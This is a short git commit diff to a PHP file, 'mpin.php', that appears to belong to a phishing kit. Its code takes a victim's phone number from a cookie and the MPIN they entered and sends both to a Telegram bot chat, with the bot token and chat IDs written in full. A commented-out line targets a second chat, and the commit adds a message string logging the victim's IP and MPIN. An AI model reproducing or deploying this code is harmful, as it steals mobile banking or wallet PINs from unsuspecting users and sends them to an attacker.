7af6d296c67be985d816ab0a69306fbe674c2d33
NonNomen404 <92431601+NonNomen404@users.noreply.github.com>
2021-11-11 21:27:52 +0700

    Update mpin.php

--- mpin.php
+++ mpin.php
@@ -1,4 +1,6 @@
 file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-578705759&text=" . $_COOKIE['number'] . " MPIN: " . $nummpin);
 
+$replyMsg = " Logged [ $ip ] \n MPIN: $mpin";
+
 // other
 //file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-582319954&text=" . $_COOKIE['number'] . " MPIN: " . $nummpin);
